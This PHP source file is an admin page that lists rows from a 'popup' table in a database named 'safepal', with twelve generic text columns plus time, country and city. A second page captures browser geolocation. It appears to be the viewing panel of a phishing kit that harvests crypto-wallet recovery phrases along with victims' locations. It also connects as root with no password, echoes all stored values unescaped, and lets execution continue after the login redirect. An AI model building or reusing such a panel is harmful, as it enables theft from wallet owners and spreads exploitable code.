<?php

session_start();

if(!isset($_SESSION['username']))
{
        header("location:login.php");
}


        $conn=mysqli_connect('localhost','root','','safepal');
        if(!$conn){
            echo "Connection failed";
        }
?>

<!DOCTYPE html>
<html lang="en">
<head>

    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>view</title>

        <!-- DataTables CSS -->
        <link rel="stylesheet" type="text/css" href="https://cdn.datatables.net/1.11.6/css/jquery.dataTables.css">

<!-- DataTables JavaScript -->
<script type="text/javascript" charset="utf8" src="https://cdn.datatables.net/1.11.6/js/jquery.dataTables.js"></script>
<!-- Bootstrap 5 CSS -->
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/5.3.0/css/bootstrap.min.css">
<!-- Data Table CSS -->
<link rel='stylesheet' href='https://cdn.datatables.net/1.13.5/css/dataTables.bootstrap5.min.css'>
<!-- Font Awesome CSS -->
<link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.6.3/css/font-awesome.min.css'>

    <style>
        body{
                margin: 0 10px;
        }
    table {
        width: 150%;
        border-collapse: collapse;
        margin-top: 20px; /* Adjust margin as needed */
    }

    th, td {
        border: 1px solid #ddd;
        padding: 8px;
        text-align: left;
    }

    th {
        background-color: #2b1691 !important;
        color: white !important;
        height: 35px;
    }

    tr:nth-child(even) {
        background-color: #f9f9f9;
    }
</style>
</head>
<body>
    
<?php
$sql = "Select * from popup ORDER BY id DESC";
$result = mysqli_query($conn, $sql);
$array = array();
while($fetch = mysqli_fetch_assoc($result)){
$array[]= $fetch;
}

?>

<div>


<?php
// $ip=$_SERVER['REMOTE_ADDR'];
// echo $ip;
// echo $timezone = date_default_timezone_get();
// // echo date_default_timezone_set('Asia/Kolkata'); // Replace with your desired timezone
// $current_time = date("H:i:s");
// echo "Current Time: " . $current_time;

function convertIPv6ToIPv4($ipv6Address) {
        // Check if the provided address is an IPv6 address
        if (filter_var($ipv6Address, FILTER_VALIDATE_IP, FILTER_FLAG_IPV6)) {
            // Check if it's in the IPv4-mapped format (::FFFF:IPv4)
            if (strpos($ipv6Address, '::FFFF:') === 0) {
                // Extract the IPv4 part
                $ipv4Address = substr($ipv6Address, 7);
                return $ipv4Address;
            }
        }
    
        // If the address is not in the IPv4-mapped format or not IPv6, return the original address
        return $ipv6Address;
    }
    
    // Example usage
    $ipv6Address = '2401:4900:1f39:b7:61da:dbde:fc5c:6353';
    $ipv4Address = convertIPv6ToIPv4($ipv6Address);
//     echo $ipv4Address;

// echo $_SESSION['username'];
?>
<a href="logout.php"><button style="background-color:blue;color: #fff;width: 80px;height: 30px;border-radius: 10px;border: none; cursor: pointer;">Logout</button></a>
<table id="example" class="table table-striped" style="width:115%">
        <thead>
            <tr>
            <th>Sr. No</th>
    <th>Text 01</th>
    <th>Text 02</th>
    <th>Text 03</th>
    <th>Text 04</th>
    <th>Text 05</th>
    <th>Text 06</th>
    <th>Text 07</th>
    <th>Text 08</th>
    <th>Text 09</th>
    <th>Text 10</th>
    <th>Text 11</th>
    <th>Text 12</th>
    <th>Date & Time</th>
    <!-- <th>IP Address</th> -->
    <th>Country</th>
    <th>City</th>
            </tr>
        </thead>
        <tbody>
        <?php
        foreach($array as $view){
?>

    <tr>
        <td>
        <?php
                echo $view['id'];
                ?>
        </td>
        <td>
        <?php
                echo $view['text1'];
                ?>
        </td>
        <td><?php
                echo $view['text2'];
                ?>
                </td>
        <td>
        <?php
                echo $view['text3'];
                ?>
        </td>
        <td> 
        <?php
                echo $view['text4'];
                ?>
        </td>
        <td>
        <?php
                echo $view['text5'];
                ?>
        </td>
        <td>
        <?php
                echo $view['text6'];
                ?>
        </td>
        <td>
        <?php
                echo $view['text7'];
                ?>
        </td>
        <td>
        <?php
                echo $view['text8'];
                ?>
        </td>
        <td><?php
                echo $view['text9'];
                ?></td>
        <td>
        <?php
                echo $view['text10'];
                ?>
        </td>
        <td>
        <?php
                echo $view['text11'];
                ?>
        </td>
        <td>
        <?php
                echo $view['text12'];
                ?>
        </td>
        <td>
        <?php
                echo $view['time'];
                ?>
        </td>
        
        
        <td>
        <?php
                echo $view['country'];
                ?>
        </td>
        
        <td>
        <?php
                echo $view['city'];
                ?>
        </td>
        
    </tr>
    <?php
        }
    ?>
</table>



</div>

<!-- jQuery -->
<script src='https://code.jquery.com/jquery-3.7.0.js'></script>
<!-- Data Table JS -->
<script src='https://cdn.datatables.net/1.13.5/js/jquery.dataTables.min.js'></script>
<script src='https://cdn.datatables.net/responsive/2.1.0/js/dataTables.responsive.min.js'></script>
<script src='https://cdn.datatables.net/1.13.5/js/dataTables.bootstrap5.min.js'></script>
<script>
$(document).ready(function() {
    $('#example').DataTable({
      //disable sorting on last column
      "columnDefs": [
        { "orderable": false, "targets": 5 }
      ],
      language: {
        //customize pagination prev and next buttons: use arrows instead of words
        'paginate': {
          'previous': '<span class="fa fa-chevron-left"></span>',
          'next': '<span class="fa fa-chevron-right"></span>'
        },
        //customize number of elements to be displayed
        "lengthMenu": 'Display <select class="form-control input-sm">'+
        '<option value="10">10</option>'+
        '<option value="20">20</option>'+
        '<option value="30">30</option>'+
        '<option value="40">40</option>'+
        '<option value="50">50</option>'+
        '<option value="-1">All</option>'+
        '</select> results'
      }
    })  
} );
</script>




</body>
</html>


<!DOCTYPE html>
<html>
<head>
    <title>Get Location</title>
</head>
<body>

<?php
// PHP code to handle the location logic
function getLocationInfo($latitude, $longitude) {
    // Simulate fetching location information (replace with your own logic or API call)
    // In a real-world scenario, you would use a reverse geocoding service
    // Example: https://api.opencagedata.com/geocode/v1/json?q=${latitude}+${longitude}&key=YOUR_OPENCAGE_API_KEY

    // Simulated response, replace with actual data from your API
    $simulatedResponse = [
        'country' => 'Simulated Country',
        'city' => 'Simulated City'
    ];

    return $simulatedResponse;
}

if (isset($_POST['get_location'])) {
    if (isset($_POST['latitude']) && isset($_POST['longitude'])) {
        $latitude = $_POST['latitude'];
        $longitude = $_POST['longitude'];

        // Use the getLocationInfo function to get location information
        $locationInfo = getLocationInfo($latitude, $longitude);

        // Output the results
        echo "Latitude: $latitude<br>";
        echo "Longitude: $longitude<br>";
        echo "Country: {$locationInfo['country']}<br>";
        echo "City: {$locationInfo['city']}<br>";
    } else {
        echo "Latitude and longitude are not set.";
    }
}
?>

<form method="post" action="">
    <button type="submit" name="get_location">Get Location</button>
    <input type="hidden" id="latitude" name="latitude">
    <input type="hidden" id="longitude" name="longitude">
</form>

<script>
function getLocation() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(showPosition);
    } else {
        alert("Geolocation is not supported by this browser.");
    }
}

function showPosition(position) {
    var lat = position.coords.latitude;
    var lon = position.coords.longitude;

    // Set the latitude and longitude in the hidden form fields
    document.getElementById('latitude').value = lat;
    document.getElementById('longitude').value = lon;
}
</script>

</body>
</html>

